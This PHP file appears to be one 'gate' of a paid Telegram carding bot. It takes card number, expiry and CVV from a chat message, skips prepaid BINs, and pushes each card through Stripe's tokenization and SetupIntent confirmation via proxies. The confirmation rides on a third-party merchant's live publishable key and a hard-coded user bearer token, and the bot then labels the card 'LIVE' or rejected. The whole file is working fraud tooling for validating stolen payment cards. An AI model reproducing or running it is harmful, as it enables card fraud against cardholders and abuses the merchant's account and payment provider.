<?php
#require_once 'function.php';

$gate = 'st';
$gateName = 'Stripe 60 usd';

#sendMessage($chat_id, $chat_type, $message_id);
verificarGate($gate, $chat_id, $message_id);

$datosUsuario = userData($user_id, $username, $chat_id, $message_id);
$rango = $datosUsuario['rango'];
$creditos = $datosUsuario['creditos'];
$anti_spam = $datosUsuario['anti_spam'];
$plan = $datosUsuario['plan'];
$warns = $datosUsuario['warns'];
$last_message_time = $datosUsuario['last_message_time'];

if($warns > 2){
  sendMessage($chat_id,"<b>⚠ You have accumulated +2 warns,please contact the $owner.</b>");
  exit();
}

$date1 = date('Y-m-d H:i:s');
$diferencia = strtotime($date1) - strtotime($last_message_time);
$tiempo_restante = $anti_spam - $diferencia;

if ($tiempo_restante > 0) {
    sendMessage($chat_id, "Time remaining: $tiempo_restante seconds.", $message_id);
    exit();
}

if ($plan !== 'premium' && $chat_type === 'private') {
    sendMessage($chat_id, "<b>⚠ Error:</b> This command is only available for premium users.", $message_id);
    exit();
} elseif ($chat_type === 'supergroup') {
    $creditos = groupPlan($chat_id, $message_id);
}

if ($creditos <= 2) {
    sendMessage($chat_id, "<b>⚠ Error: You don't have enough credits.</b>", $message_id);
    exit();
}

$date1 = date('Y-m-d H:i:s');
$diferencia = strtotime($date1) - strtotime($last_message_time);
$tiempo_restante = $anti_spam - $diferencia;

if ($tiempo_restante > 0) {
    sendMessage($chat_id, "Time remaining: $tiempo_restante seconds.", $message_id);
    exit();
}

updateTime($user_id);

$lista = clean($message) ?: clean($r_message);
$exploded = multiexplode(array(":", "/", " ", "|", "::"), $lista);
$cc = $exploded[0];
$mes = $exploded[1];
$ano = $exploded[2];
$cvv = $exploded[3];

$mes = ltrim($mes, '0');
$ano = strlen($ano) == 2 ? '20' . $ano : $ano;

validateCreditCard($cc, $cvv, $mes, $ano, $gate, $gateName, $chat_id, $message_id);

/* BIN INFO[informacion del bin] */

$datoscc = "$cc|$mes|$ano|$cvv";
$ccbin = substr($cc, 0, 6);

$tiempo = microtime(true);
$mytime = 'time1';

$binData = getBinData($ccbin);

if($binData['level'] == 'prepaid'){
  sendMessage($chat_id, "<b>⚠ Error: bin prepaid locked.\nContact the owner $owner if you think it's a mistake.</b>", $message_id);
  exit();
}


$lod = "<em>
    🔄 Please Wait ...
    Card : <code>$datoscc</code>
    Country : {$binData['pais']} {$binData['flag']}
    Bank : {$binData['banco']}
    ━━━━━━━━━━━━━━
    Time : {$mytime($tiempo)}s
    By : @DEVPHPJS
    </em>";

$m1 = sendMessage($chat_id, $lod, $message_id);
$m1 = $m1['result']['message_id'];


$cookieFile = 'galletas/cookie_' . uniqid() . '.txt';


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: api.stripe.com',
    'accept: application/json',
    'accept-language: es-ES,es;q=0.9',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
    'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_PROXY, $proxie);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[name]=jhin+vega&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano&card[address_zip]=33010&guid=41936ddc-a8b5-4b0d-97a7-d7dd5136062e715399&muid=6d765bad-2211-4bdf-983d-be7c9388f42dc47d56&sid=d67895b8-fcbf-42bc-b1b7-c4e03f5f4142866f72&payment_user_agent=stripe.js%2Fe6133d40df%3B+stripe-js-v3%2Fe6133d40df%3B+card-element&time_on_page=1429335&key=pk_live_o8Fxr1oK9qe4rNFdaedbCjk1&pasted_fields=number");
$r1 = curl_exec($ch);

curl_close($ch);

$z = json_decode($r1);
$id = $z->id;

if(empty($id)){
  editMessage($chat_id,'<b><em>Error: failed to capture id</em></b>', $m1);
}

#-----------2 REQ

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://graphql2.trint.com/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: graphql2.trint.com',
    'accept: */*',
    'accept-language: es-ES,es;q=0.9',
    'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwczovL2FwcC50cmludC5jb20vdXNlcklkIjoiNjRjMTExYTg2ZTM2ODNiMTM4YmY0ZDk5IiwiaHR0cHM6Ly9zY2hlbWEudHJpbnQuY29tL2F1dGgvdXNlcklkIjoiNjRjMTExYTg2ZTM2ODNiMTM4YmY0ZDk5IiwiaHR0cHM6Ly9hcHAudHJpbnQuY29tL2lzTmV3VXNlciI6ZmFsc2UsImh0dHBzOi8vc2NoZW1hLnRyaW50LmNvbS9hdXRoL2p0aSI6ImMxYjAwYmYxLTMxYmMtNGI3Yi1hYWU5LTVhZGQ3NTVkZTU1OCIsImlzcyI6Imh0dHBzOi8vdHJpbnQuYXV0aDAuY29tLyIsImF1ZCI6ImljaDRoeVZZUEtLZ2VFb1RoNmZXUFhjNmZydmVUY1RxIiwiaWF0IjoxNjkwMzc0NTg5LCJleHAiOjE2OTE2NzA1ODksInN1YiI6Imdvb2dsZS1vYXV0aDJ8MTA3NDMwNzEzMTkwODQxNDIzNzMzIiwic2lkIjoiLWFvanVqY1lzXzJLX1ctYWUyZFU3MzFNMmxxTGFMX04ifQ.ap4yQq5n4fT-UKA13nVe9uUmFMSNRcyvEOIaQ-_auCY',
    'content-type: application/json',
    'origin: https://app.trint.com',
    'referer: https://app.trint.com/',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'x-trint-request-id: b8add549-7aa2-468b-8d9b-71547b76d97d',
    'x-trint-super-properties: {}',
    'x-trint-user-metadata: undefined',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_PROXY, $proxie);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"operationName":"paymentSetupQuery","variables":{},"query":"query paymentSetupQuery {\\n  getPaymentMethodSetupIntent\\n  user {\\n    _id\\n    currentSubscription {\\n      id\\n      planCode\\n      planId\\n      productId\\n      productType\\n      seats\\n      __typename\\n    }\\n    billing {\\n      last4\\n      v2 {\\n        subscriptionStatus\\n        __typename\\n      }\\n      __typename\\n    }\\n    group {\\n      owner {\\n        _id\\n        __typename\\n      }\\n      __typename\\n    }\\n    growthExperiments {\\n      name\\n      variant\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n"}');

$r2 = curl_exec($ch);

curl_close($ch);

$x = json_decode($r2, true); // Utilizamos true para obtener un array asociativo

$seti = $x['data']['getPaymentMethodSetupIntent'];
$seti_id = substr($seti, 0, strpos($seti, "_", strpos($seti, "_") + 1));

if(empty($seti)){
  editMessage($chat_id,'<b><em>Error: failed to capture getPaymentMethodSetupIntent</em></b>', $m1);
}


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/setup_intents/$seti_id/confirm");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: api.stripe.com',
    'accept: application/json',
    'accept-language: es-ES,es;q=0.9',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
    'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_PROXY, $proxie);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, "payment_method_data[type]=card&payment_method_data[card][token]=$id&payment_method_data[guid]=41936ddc-a8b5-4b0d-97a7-d7dd5136062e715399&payment_method_data[muid]=6d765bad-2211-4bdf-983d-be7c9388f42dc47d56&payment_method_data[sid]=d67895b8-fcbf-42bc-b1b7-c4e03f5f4142866f72&payment_method_data[payment_user_agent]=stripe.js%2Fe6133d40df%3B+stripe-js-v3%2Fe6133d40df&payment_method_data[time_on_page]=1430306&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_o8Fxr1oK9qe4rNFdaedbCjk1&client_secret=$seti");

$r3 = curl_exec($ch);

curl_close($ch);

$y = json_decode($r3);

$code = $y->error->code;
$msg= $y->error->message;


if (strpos($r3, "Your card's security code is incorrect.")) {
    $status = "LIVE CCN ✅";
    $response = $msg;
    restarCreditos($chat_id);
} elseif (strpos($r3, 'Your card has insufficient funds.')) {
    $status = "LIVE CVV ✅";
    $response = $msg;
    restarCreditos($chat_id);
} elseif (strpos($r3, '"cvc_check":"pass"')) {
    $status = "LIVE CVV ⚡";
    $response = "card added successfully ✅";
    restarCreditos($chat_id);
} else {
    $status = "REPROVADA 🔴";
    $response = $msg;
}

$cmdr = "
<a href='https://t.me/rudeos_greyrat_chk'> 𝙍𝙪𝙙𝙚𝙤𝙨_𝙘𝙝𝙠𝘽𝙤𝙩</a>
<em>                
[Ϙ] <b>card</b> ➳ <code>$datoscc</code>
[Ϙ] <b>status</b> ➳ $status
[Ϙ] <b>response</b> ➳ $response
[Ϙ] <b>code</b> ➳ $code

[Ϙ] <b>search bin.</b> ➳ {$binData['pais']} {$binData['flag']}
{$binData['banco']} - {$binData['level']} - {$binData['tipo']}

[Ϙ] <b>Time</b> ➳ {$mytime($tiempo)}s
[Ϙ] <b>gate</b> ➳ $gateName
[Ϙ] <b>User</b> ➳ @$username [<b>$rango</b>]
[Ϙ] <b>$owner</b>
</em>";

editMessage($chat_id, $cmdr, $m1);
